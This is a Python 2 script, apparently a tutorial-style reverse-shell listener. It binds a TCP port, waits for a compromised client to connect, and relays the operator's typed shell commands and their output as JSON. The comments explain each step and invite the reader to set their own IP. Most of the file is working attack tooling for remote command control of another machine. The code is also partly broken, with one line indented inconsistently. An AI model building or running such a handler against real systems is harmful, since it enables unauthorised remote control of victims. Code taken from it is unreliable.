#!/usr/bin/python
# ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
# ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
# ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
# ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
# ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
# ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

# YOU HAVE TO RUN IT IN YOUR OWN MACHINE------------------------------------------------------------------ #
                                                 
import socket  #importing socket library to so that we can create and set socket
import json    #importing json library because by default socket.recv(1024) can recieve only 1024 bytes output so that it cant recieve whole output for some commands

#Defining big_send() and big_recv() using json object so that we can dump data into json_data and display it that helps to cross that socket.recv(1024) boundry
def big_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def big_recv():    # doesn't need to pass value because we are recieving data from client
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:  # handling expection so that program runs even recieving big amount of data 
			continue

#creating socket and setting up options ------------------------------------------------------------------#
# Functions and uses
# socket.AF_INET = it used to specifies we are using ipv4 adress to connection
# socket.SOCK_STREAM = it specifies we will establish connection with TCP
# socket.SOL_SOCKET = it is socket layer itself it uses to manipulate socketoptions and passing as int constant in setsockopt method
# socket.SO_REUSEADDR = is boolean and enable its to use same port for another socket and reuse that adress basically it allows to more then one socket process same time
# s.setsockopt = is for setting socket option

def server():

	global ip        #making ip, target and socket s variable global so that we can use it in whole program
	global target
	global s
    
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # creating socket object s and passing two param.
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) # set socket option
    
	#---------------------------------------that's things you can change------------------------------------#
    
	s.bind(("127.0.0.1",44443))  # binding connection you can change that to your own inet ipv4 but it's good to test on local ip before use it
    
	#-------------------------------------------------------------------------------------------------------#
    
    s.listen(5)                  # Listening for incoming connection and value inside brackets specifies max number of connection to accept


	target, ip = s.accept()      # s.accept() stores ip adress of client and port they connected 
	print("Connected!! message from server")

# defining shell function to sending msgs and recieving result

def shell():
	while True:                                     # we have to loop it because either we can't run morethen one command
		cmd = raw_input("SHELL~#$ %s" % str(ip))    
		big_send(cmd)	
		if cmd == "q":                              # when type q it will close the connection
			print("Terminating connection from server.....")
			break
		else :
			result = big_recv()
			print(result)


server()
shell()
s.close()
